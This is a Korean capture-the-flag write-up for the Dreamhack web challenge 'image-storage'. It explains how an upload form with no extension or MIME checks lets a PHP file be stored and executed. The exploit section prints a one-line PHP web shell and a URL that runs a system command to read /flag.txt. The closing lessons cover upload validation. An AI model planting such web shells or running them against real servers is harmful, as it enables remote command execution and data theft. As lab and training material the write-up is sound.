---
ctf_name: "Dreamhack"
challenge_name: "image-storage"
category: "web"
difficulty: "easy"
author: "sihyunkimm"
date: "2026-05-25"
tags: [file-upload, webshell, rce]
---

# image-storage

## 문제 설명

> 제공된 웹 애플리케이션의 파일 업로드 기능을 악용하여 서버에 웹쉘(Web Shell)을 업로드하고, 시스템 명령어를 실행하여 `/flag.txt` 파일을 탈취하는 과정을 정리합니다.

- 접근: Dreamhack VM
- 주요 기능: 파일 업로드

## 풀이

### 분석

- 업로드 처리 로직에 파일 확장자, MIME 타입, 파일 내용에 대한 검증이 없습니다.
- 사용자가 전송한 파일명 `$name`을 그대로 사용해 `./uploads/` 디렉토리에 저장합니다.
- 따라서 공격자는 `.php` 파일을 업로드하고, 웹 서버가 이를 직접 실행하는 형태로 RCE를 만들 수 있습니다.

### 취약점

- 검증 로직 부재: 업로드되는 파일의 확장자, MIME 타입, 파일 내용에 대한 필터링이 전혀 없습니다.
- 경로 및 명칭 제어: 사용자가 전송한 파일명을 그대로 저장하므로, 실행 가능한 PHP 파일을 업로드할 수 있습니다.

### 익스플로잇

1. 웹쉘로 사용할 `cmd.php` 파일을 작성합니다.

```php
<?php system($_GET['cmd']); ?>
```

2. 작성한 파일을 `upload.php` 페이지의 업로드 폼으로 전송합니다.

3. 업로드된 파일에 직접 접근해 `cmd` 파라미터로 시스템 명령을 실행합니다.

```text
http://서버주소/uploads/cmd.php?cmd=cat /flag.txt
```

4. 서버 내부의 `/flag.txt` 내용이 출력되면 플래그 획득에 성공합니다.

## 플래그

```
flag{REDACTED}
```

## 배운 점

- 파일 업로드 기능은 단순히 저장만 해도 위험해질 수 있으므로, 확장자와 MIME 타입, 저장 경로를 함께 검증해야 합니다.
- 업로드된 파일이 웹에서 실행 가능한 위치에 저장되면 곧바로 RCE로 이어질 수 있습니다.